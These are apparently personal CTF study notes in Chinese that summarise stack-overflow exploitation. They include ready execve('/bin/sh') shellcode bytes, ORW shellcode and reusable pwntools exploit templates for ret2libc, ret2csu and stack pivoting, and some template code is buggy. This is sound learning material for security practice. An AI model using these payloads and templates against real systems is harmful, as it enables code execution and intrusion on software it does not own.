[toc]

## 栈溢出攻击总结

**备注**：陆陆续续也做了不少题目了，但是似乎缺乏一些系统性的总结，特别是在`pwn`这块，栈溢出的各种技巧有待持续加强。本篇首先总结一下栈溢出的一些方式。同时，也会把攻击脚本记录在这里，以便后续取用。

### 1、shellcode

#### 利用原理

控制程序执行流去执行机器码指令

#### 使用条件

可以控制`EIP`寄存器，程序关闭了`NX`保护或者某个可读可写段具有可执行权限。可以结合`mprotect`函数或者`mmap`函数执行攻击。

当程序关闭了`NX`保护，这个时候可以考虑`shellcode`，`shellcode`不一定是获取`shell`，也可以是`ORW`的`shellcode`，即为`open(/flag)`------`read(3, addr, 0x30)`------`write(1, addr, 0x30)`。

#### 常用脚本 

##### 1）普通shellcode

首先记录一些常用的`shellcode`，分别适用于`32`位和`64`位系统，更多shellcode可以访问[shellstorm](http://shell-storm.org/shellcode/)

```
shellcode---linux---execve(/bin/sh)
-----------------------------------------------------------------------------
i386, 长度23字节
shellcode="\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"

amd64，长度29字节
shellcode = "\x6a\x42\x58\xfe\xc4\x48\x99\x52\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5e\x49\x89\xd0\x49\x89\xd2\x0f\x05"
```

##### 2）禁用了system的shellcode

这里也放一下`orw`的`shellcode`，偶尔会遇到这种题。

```python
from pwn import *
# 这里的架构可以按需更改
context.update(arch='i386', os='linux', endian='little')
shellcode = shellcraft.open('/home/orw/flag',0)
shellcode += shellcraft.read('eax','esp', 0x30)
shellcode += shellcraft.write(1, 'esp', 0x30)
print(asm(shellcode))

# 手写汇编
'''
/* push b'/home/orw/flag\x00' */
push 0x1010101
xor dword ptr [esp], 0x1016660
push 0x6c662f77
push 0x726f2f65
push 0x6d6f682f
mov ebx, esp
xor ecx, ecx
xor edx, edx
/* call open() */
push 5 /* 5 */
pop eax
int 0x80
/* read(fd='eax', buf='esp', nbytes=0x30) */
mov ebx, eax
mov ecx, esp
push 0x30
pop edx
/* call read() */
push 3 /* 3 */
pop eax
int 0x80
/* write(fd=1, buf='esp', n=0x30) */
push 1
pop ebx
mov ecx, esp
push 0x30
pop edx
/* call write() */
push 4 /* 4 */
pop eax
int 0x80
'''
```

##### 3）限制了字符的shellcode

比如说，题目对输入的`shellcode`进行限制，只能输入可打印字符，这个时候，可以利用`alpha3`工具来生成所需要的`shellcode`，生成的过程为：

- 利用`pwntools`的`shellcraft`工具生成`shellcode`，并以字节流的形式保存在文件中
- 利用`alpha3`工具，输入命令：`python ALPHA3.py x64 ascii mixedcase rax --input='shellcode' > ../temp/x64_out`这句话的意思是，平台为`x64`，输出可见字符，程序中有`call rax`语句，`shellcode`是刚刚保存的那个文件，最后生成的内容写入到`x64_out`。需要注意：**alph3安装在python2环境中运行。**

还有一些其他的利用思路，可以看这篇文章：[shellcode的艺术](https://xz.aliyun.com/t/6645#toc-4)

### 2、ROP

#### 利用原理

所谓`ROP`，全名为`return-oriented-program`，是一种栈溢出利用的方法，用来攻击开启了`ASLR`、`Canary`、`PIE`等防护手段的程序，利用各种`gadget`，或巧妙的栈劫持方式，控制程序执行流，最终获取`shell`。

#### 使用条件

1. 存在栈溢出，可以获取有效的`gadget`，或者可以执行系统调用指令
2. 需要泄露`libc`加载的基地址或者程序加载的基地址
3. 能控制`EIP`指针

#### 2.1 ret2func

**使用**：当程序中存在一些后门函数，例如`system(/bin/sh)`或者`open('/flag')`之类的函数，可以将这些函数的地址`pop`到`EIP`寄存器，控制程序获取`shell`或者打印出来`flag`。

此类利用方式较为简单，只需要计算出`buffer`到函数返回地址的偏移即可。

#### 2.2 ret2syscall

**使用**：这里只需要明确概念，然后寻找对应的`gadget`即可。所谓`ret2syscall`，就是不直接调用`libc`函数，而是通过系统调用的方式，来执行相关函数。在`i386`下执行系统调用为`int 80`指令，`amd64`为`syscall`的`gadget`。这里也对传参寄存器进行总结：

```
i386:
eax存放系统调用号
ebx存放第一个参数
ecx存放第二个参数
edx存放第三个参数
int 80 执行系统调用
----------------------------------------------
amd64:
rax存放系统调用号
rdi存放第一个参数
rsi存放第二个参数
rdx存放第三个参数
syscall 执行系统调用
```

**ret2syscall的一些小技巧**：

- 如果找不到对应的`64`位寄存器的`gadget`，可以尝试找找`32`位寄存器的，前提是参数可以只取低地址4个字节，不受高字节的影响。比如说，可以不找`pop rax; ret`而去找`pop eax; ret`。
- `rax/eax`会存放函数的返回值，所以，有时候找不到`eax`相关的`gadget`可以利用返回值来构造。
- 在`64`位系统下，很缺`gadget`的话，可以利用`ret2csu`完成攻击
- 有时候缺少写入函数的话，可以利用`lea`或者`mov`指令完成写入。
- 有时候可以`ret2reg`，看寄存器有没有存`buffer`的地址。
- 还有`ret2rsp`，配合`jmp rsp`的`gadget`配合利用。
- 注意除了有`execve`的系统调用，还有`execveat`，因此还有`openat`等，这些以`at`位后缀的系统调用也可以考虑！

再总结一下常用的系统调用号对应函数：

```
i386:
函数名		系统调用号
read        3
write		4
open		5
execve		11
sigreturn	119

amd64:
read		0
write		1
open		2
execve		59
sigreturn	15
```



#### 2.3 ret2libc

**使用**：程序没有直接给`system`函数或者`execve`函数的地址，但是提供了`puts`、`write`等函数可以用于泄露函数的地址。构造`ROP`链来获取`shell`。

**攻击模板**：

```python
def ret2libc_i386_mannul():
    '''
    ret2libc，X86架构下，手动写rop链
    一般是结合LibcSearcher进行泄露system地址
    如果需要一些其他的操作，可以找一些pop指令用于清理栈
    
    '''
    elf = Elf('')
    io = process('')
    payload = b'xxx' # 前面的偏移
    payload += b'puts_plt' # 用于泄露地址的函数
    payload += elf.sym['main'] # 返回main函数
    payload += elf.got['puts'] # 要泄露的函数的got地址，这里泄露puts函数的地址
    io.send(payload)
    leak_addr = io.recv(4) # 获取到puts的地址
    # 接下来利用libcsearcher库来泄露函数地址
    libc = LibcSearcher('puts', leak_addr)
    libc_base_addr = leak_addr - libc.dump('puts')
    system_addr = libc_base_addr + libc.dump('system')
    str_bin_sh = libc_base_addr + libc.dump('str_bin_sh')
    
    # 第二次填充payload，执行system /bin/sh
    payload = b'xxx'
    payload += p32(system_addr)
    payload += b'aaaa'
    payload += p32(str_bin_sh)
    io.send(payload)
    


def ret2libc_amd64_mannual():
    '''
    ret2libc X64架构下 手动写payload
    '''
    elf = Elf('')
    io = process('')
    pop_rdi_ret_addr = 0x0 # 以下三个都是gadget，可以利用ROPgadget工具寻找
    pop_rsi_ret_addr = 0x0
    pop_rdx_ret_addr = 0x0
    payload = b'xxx' # 前面的偏移，直到函数返回地址
    payload += p64(pop_rdi_ret_addr) + p64(1) # write函数的第一个参数
    payload += p64(pop_rsi_ret_addr) + p64(elf.got['read']) # 第二个参数
    payload += p64(pop_rdx_ret_addr) + p64(0x20) # 第三个参数
    payload += p64(elf.plt['write']) # write函数的地址
    io.send(payload) 
    leak_addr = io.recv(6) #泄露出来的地址
    # 利用libc来计算
    libc = LibcSearcher('read', leak_addr)
    libc_base_addr = leak_addr - libc.dump('read')
    system_addr = libc_base_addr + libc.dump('system')
    str_bin_sh = libc_base_addr + libc.dump('str_bin_sh')
    
    payload = b'xxx'
    payload += p64(pop_rdi_ret_addr) + p64(str_bin_sh)
    payload += p64(system_addr)
    io.send(payload)
    
def ret2libc_pwntools():
    '''
    ret2libc。
    利用pwntools的工具来写payload，主要利用ROP类
    记得设置一下context, 改下架构即可
    '''
    context.update(arch='i386/amd64', os='linux', endian='little')
    elf = Elf('')
    io = process('')
    rop = ROP(elf)
    rop.raw(b'xxx') # 前面的填充
    rop.call('write', [1, elf.got['write'], 0x10]) # 调用write函数
    rop.call('main', []) # 回到main函数
    print(rop.dump()) # 这里打印下rop，可以检查一下有没有问题
    payload = rop.chain() # 生成payload
    io.send(payload)
    leak_addr = io.recv()
    # 利用libc来计算
    libc = LibcSearcher('write', leak_addr)
    libc_base_addr = leak_addr - libc.dump('write')
    system_addr = libc_base_addr + libc.dump('system')
    str_bin_sh = libc_base_addr + libc.dump('str_bin_sh')
    # 这里调用system可以这样
    rop = ROP(elf)
    rop.raw(b'xxx')
    rop.call(system_addr, [str_bin_sh])
    io.send(rop.chain())
```

#### 2.4 ret2csu

**使用**：这是一个万能的`gadget`，主要针对`amd64`架构的程序，一般是程序中找不到`pop rdx  ; ret`的`gadget`，泄露函数是`write`，写入的函数是`read`，反正是需要传入三个参数。还有一个前提，栈溢出至少需要`128`个字节，或者更多。

**攻击模板**

```python
def ret2csu(csu_end_addr:int, csu_start_addr:int, ret_addr:int,
            r12, r13, r14, r15, rbx=0, rbp=1):
    """
    return2csu
    一般程序找不到pop rdx的gadget，需要利用write或者read函数。
    这里需要找好r13 r14 r15和rdi rsi rdx之间的对应关系，还要分清是rdi还是edi
    如果是edi，只能控制低4个字节的内容
    此处示例为r13---rdx r14---rsi r15---edi
    """
    io = process('')
    cur_elf = ELF('')
    
    # ret2csu
    payload = b'a' * 0x0 # 前面的填充
    payload += p64(csu_end_addr) # 这个地址一般对应的指令为pop rbx
    payload += p64(rbx) # 0 为了能直接call r12 ptr 
    payload += p64(rbp) # 1 绕过cmp指令
    payload += p64(r12) # 填func@got，调用r12存储的地址处的函数，注意这里指令是call ptr
    payload += p64(r13) # 对应的是rdx
    payload += p64(r14) # 对应的是rsi
    payload += p64(r15) # 对应的edi
    payload += p64(csu_start_addr) # 这里对应的指令一般是mov rdx r13
    payload += 0x38 * b'a' # 栈会被抬高0x38个字节，这里也可以布局rbp的值，用于后续栈迁移等
    payload += p64(ret_addr) # 调用完csu链后返回的地址，比如main函数地址
    
    print("len of payload:{}".format(payload))
    io.send(payload)
```

#### 2.5 stack pivot attack

**使用**：栈迁移攻击的题目很有特点，需要滿足两个条件：1）可泄露地址或者程序不开启`PIE`；2）栈溢出超过`ebp`指针的字节为`2`个指针大小，刚好只能覆盖到函数返回地址。在`32`位系统下，溢出`ebp`指针后`8`个字节，`64`位系统下，溢出`rbp`指针后`16`个字节。

**原理**：栈溢出的原理并不复杂，核心是利用`leave;ret`这一个`gadget`。在`64`位系统下，该`gadget`的含义其实包括两条指令：`mov rbp rsp, pop rbp;pop rip`。将`rsp`移动到`rbp`指向的位置，然后`pop rbp`，将栈顶指针指向的内容存入到`rbp`寄存器，然后`rsp `往高地址移动`8`个字节，再执行`pop rip`，将此时栈顶指针的内容赋给`rip`寄存器，开始执行程序流。事实上，只需要有`pop rsp; ret`这样的`gadget`就能完成栈迁移。

```python
def stack_pivot_attack(io, elf, leave_ret_addr:int, fake_rbp_addr:int):
    '''
    栈迁移：程序溢出的字节数为两个指针大小，只能覆盖到函数返回地址
    将栈迁移到其他可写入的地方，如bss段，data段，libc的free_hook上方
    需要寻找一个leave;ret的gadget, 这里以64位为例
    
    '''  
    # 第一步是往fake_rbp_addr写入rop链
    payload = fake_rbp_addr + 0x200 # fake rbp 2
    payload += 0x0 # 这里开始，可以填写真正的rop链，如要执行的函数地址等
    # ......
    io.read(0, fake_rbp_addr, 0x60) # 触发某写入函数，往地址里面写入ROP
    
    # 第二步是控制栈溢出
    payload = 0x0 * b'a' # junk data
    payload += p64(fake_rbp_addr) # 填充rbp
    payload += p64(leave_ret_addr) # 填充返回地址
    io.send(payload)
    
    # 之后，程序会去执行rop链
```

#### 2.6 ret2sigreturn



#### 2.7 ret2vsdo



#### 2.8 ret2dl_resolve



### 3、绕过Canary

`canary`是一种栈保护手段，一般有以下特点：

- `canary`可以检测出程序是否存在栈溢出
- `canary`一般就在`ebp`指针的下方
- `canary`是一个随机值，结尾一定是`\x00`
- 同一个进程内，所有子进程的所有的函数的`canary`都是一样的

#### 3.1 泄露canary



#### 3.2 爆破canary



#### 3.3 利用stack smashing打印flag



#### 3.4 劫持stack_chk_fail



#### 3.5 修改TLS段的canary值

